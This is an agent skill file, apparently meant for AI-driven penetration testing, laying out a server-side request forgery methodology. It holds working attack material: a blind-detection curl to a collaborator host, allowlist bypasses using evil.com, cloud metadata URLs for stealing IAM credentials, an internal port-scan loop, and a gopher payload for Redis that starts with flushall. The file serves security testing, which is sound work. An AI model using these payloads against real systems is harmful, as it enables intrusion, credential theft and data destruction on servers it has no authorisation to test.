---
name: ssrf-methodology
description: "Server-side request forgery methodology: identifying fetch-capable parameters, bypassing allowlists, and reaching internal services. Use this skill when a server fetches a user-supplied URL."
---

# SSRF

## Overview

The server makes a request the user controls. Impact: internal service access, cloud metadata, port scanning, and file read via supported schemes.

## Find the sink

- URL parameters: `url=`, `image=`, `webhook=`, `callback=`, `next=`
- File imports from a URL
- PDF/screenshot generators
- Webhook configuration
- XML external entities (SSRF via XXE)

```bash
# blind detection with a collaborator
curl "https://t/fetch?url=http://YOUR-COLLABORATOR/"
```

## Classification

| Type | Behavior |
|---|---|
| Full response | data returned to the user |
| Blind | only timing/errors observable |
| Semi-blind | error messages leak details |

## Bypass techniques

| Filter | Bypass |
|---|---|
| `127.0.0.1` blocked | `0177.0.0.1`, `2130706433`, `0x7f000001`, `[::1]`, `127.1` |
| Domain allowlist | `trusted.com@evil.com`, `evil.com#trusted.com` |
| Prefix check | `trusted.com.evil.com` |
| Redirect blocked | open redirect on trusted domain, DNS rebinding |
| Scheme blocked | `gopher://`, `dict://`, `file://`, `ftp://` |

## Cloud metadata

```bash
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP
http://metadata.google.internal/computeMetadata/v1/  (Metadata-Flavor: Google)
# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Metadata: true)
# Alibaba
http://100.100.100.200/latest/meta-data/
```

Headers cannot be set through a plain URL parameter — for GCP/Azure you need a redirect or a proxy that forwards them.

## Internal scanning

```bash
for p in 22 80 443 3306 6379 9200; do
  curl -s -o /dev/null -w "$p %{time_total}\n" "https://t/fetch?url=http://127.0.0.1:$p/"
done
```

## Gopher for protocol attacks

`gopher://` builds raw TCP payloads — Redis, MySQL, SMTP.

```bash
# redis RCE payload (URL-encoded)
gopher://127.0.0.1:6379/_%2A1%0D%0A%24%38%0D%0Aflushall%0D%0A...
```

## Pitfalls

- A response that says "invalid URL" is still informative — try other schemes.
- DNS rebinding requires a controlled domain with a short TTL.
- Blocked `169.254.169.254` often still allows `metadata.google.internal`.

## Verification

The SSRF must return internal data or produce an observable out-of-band callback.
